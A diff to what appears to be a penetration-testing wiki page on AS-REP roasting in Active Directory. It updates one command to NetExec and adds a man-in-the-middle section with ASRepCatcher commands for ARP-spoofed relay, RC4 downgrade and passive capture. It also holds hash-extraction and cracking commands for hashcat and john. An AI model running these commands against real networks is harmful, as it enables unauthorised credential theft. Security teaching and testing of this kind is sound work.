@@ -34,10 +34,10 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $K
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
-This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).
+This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
 
 ```bash
-crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
+netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
 ```
 
 The [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit is a good alternative to the tools mentioned above.
@@ -52,6 +52,8 @@ Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
 {% endtab %}
 {% endtabs %}
 
+
+
 Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](../credentials/cracking.md).
 
 ```bash
@@ -60,6 +62,21 @@ hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
 
 ```bash
 john --wordlist=$wordlist ASREProastables.txt
+```
+
+### ASREProast MitM
+
+Another way to conduct AS-REP roasting, without relying on Kerberos pre-authentication being disabled, would be to have a man-in-the-middle position on the network and catch AS-REPs. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).
+
+```bash
+# Proxy between the clients and the DC, forcing RC4 downgrade if supported
+ASRepCatcher relay -dc $DC_IP
+
+# Disables ARP spoofing (the MitM must be obtained with other means)
+ASRepCatcher relay -dc $DC_IP --disable-spoofing
+
+# Passively listen for AS-REP packets, no packet alteration
+ASRepCatcher listen
 ```
 
 ## Resources
